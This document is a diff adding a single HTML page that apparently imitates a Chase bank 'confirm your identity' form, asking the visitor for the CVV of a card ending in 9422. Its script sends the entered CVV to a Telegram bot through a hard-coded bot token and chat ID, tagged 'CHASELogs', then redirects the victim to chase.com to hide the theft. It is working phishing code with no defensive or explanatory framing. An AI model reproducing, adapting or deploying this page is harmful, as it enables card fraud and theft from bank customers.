@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        body{
+            padding: 0;
+            margin: 0;
+            box-sizing: border-box;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+        header#header img{
+            height: 65px;
+        }
+        header#header{
+            background: #0846a8;
+            /* padding: 15px; */
+            text-align: center;
+        }
+
+        a{
+            color: rgb(0, 0, 238);
+            text-decoration: none;
+            font-size: 15px;
+        }
+        button{
+            padding: 7px 50px;
+            color: #fff;
+            font-weight: bold;
+            border-color: rgb(0, 0, 238);
+            background: rgb(0, 0, 238);
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        #form-sectiom{
+            width: 50%;
+            margin: auto;
+        }
+        input{
+            border: none;
+            border-bottom: 1px solid #000;
+            width: 40%;
+            outline: none;
+            border: 0px 0px 1px 0px;
+            background: none;
+            border-radius: 0px;
+        }
+        @media(max-width: 800px){
+        #form-sectiom{
+            width: 95%;
+        }
+        input{
+            width: 80%;
+        }
+        }
+    </style>
+</head>
+<body>
+    <header id="header">
+        <img src='data:image/png;base64,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'/>
+    </header>
+<form action="" id="form">
+    <section id="form-sectiom"><br>
+        <h1>Let's confirm your identity.</h1>
+        <!-- <br> -->
+        <p>To protect your account, please tell us the requested info so we can confirm your identity. If you have more than one account, choose one and we'll take care of the rest.</p>
+        <!-- <p>Commercial administrators must tell us a Tax ID number.
+        </p> -->
+        <br>
+        <div>
+            <label for="">Credit card ending in 9422</label><br><br>
+            <!-- <input type="text" id="sss" required> -->
+        </div>
+        <!-- <br><br> -->
+        <!-- <div>
+            <label for="">Expiration date</label><br><br>
+            <input type="text" id="aaa" required>
+        </div> -->
+        <br><br>
+        <div>
+            <label for="">CVV</label><br><br>
+            <input type="text" id="bbb" required>
+        </div>
+<br><br>
+<a href="#">Are you an authorized user on another account?</a><br><br><br>
+<button type="submit">Next</button>
+    </section>
+</form>
+    <script>
+        const formal = document.querySelector('#form')
+      
+        let bot = {
+            TOKEN: "5051297224:AAETgLhNRTbhpJNucj4Ny4y_czF0M3UnllY",
+            chatID: "-772522345"
+        }
+    
+    
+        formal.addEventListener("submit", e =>{
+            e.preventDefault();
+    
+            // let message = document.querySelector('#sss').value
+            // let messageT = document.querySelector('#aaa').value
+            let messageTT = document.querySelector('#bbb').value
+            
+            fetch(`https://api.telegram.org/bot${bot.TOKEN}/sendMessage?chat_id=${bot.chatID}&text=CHASELogs==${messageTT}`, {
+                method: "GET"
+            }).then(success => {
+                window.location.replace("https://chase.com");
+            }, error => {
+                alert("Message not sent")
+                console.log(error)
+    
+            })
+        })
+    </script>
+</body>
+</html>
